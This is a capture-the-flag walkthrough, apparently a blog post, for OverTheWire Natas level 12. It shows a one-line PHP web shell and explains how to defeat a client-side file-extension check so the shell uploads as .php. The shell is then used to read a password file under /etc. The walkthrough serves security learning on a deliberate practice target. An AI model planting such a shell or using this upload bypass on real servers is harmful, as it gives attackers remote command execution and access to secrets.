---
layout: post
title:  "Natas Level 11 â†’ Level 12"
date:   2021-05-26 15:37:21
categories: ctf wargames web-security
tags: wargames ctf overthewire web-security
series: "OverTheWire: Natas"
excerpt: Extension tension
mathjax: false
---

## Level Goal
Excluding the URL and username, the Level Goal section is blank for the Natas ctf.


## Solution
The natas12 website allows us to select and upload an image, and view the page source. Since the source is now starting to get a bit longer, I'll highlight the pertinent line(s) below.

```html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
```

Here we see that whatever we upload will be assigned a random name and have the .jpg extension appended to it. The intention here is to secure the upload form by appending the jpg extension of anything uploaded. This should prevent a malicious user from uploading a shell script and executing it from the uploads directory since jpg is non-executable. Since this change is done on the client-side, it can be bypassed with ease.


```php
<? passthru($_GET["cmd"]); ?>
```

That's it. I'll refer to this script as shell.php. You can name it whatever you like.

Before we upload this script, we need to alter the client-side code to deal with the appending of .jpg to our upload.

Open the web developer tools for your browser and use the inspector to quickly locate the upload section of the code. You should see something similar to the following:

```html
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000">
<input type="hidden" name="filename" value="upzknql2yq.jpg">
```

The last line is the one we're looking for. The name of the file, **upzknql2yq** will be different for you.  This name was generated by the genRandomString() function we saw in the first script. Change the extension from .jpg to .php using the developer tools. Do not refresh the page or use the browser navigation buttons, or you'll need to change the extension once again.

With the extension now changed, click on the browse button, select shell.php, and then click upload. 

You should see a message similar to the following:
```
The file upload/zidcnm44f9.php has been uploaded
```

Make certain that the uploaded file ends in .php. If not, navigate back and re-edit the page source using the developer tools. Once you have the confirmation that the file uploaded with the .php extension, copy the link to the file location. Do not click the link.

Paste the link into the browser and append the following to the URL:
```
?cmd=cat /etc/natas_webpass/natas13
```

This will display the password to the next level in the browser.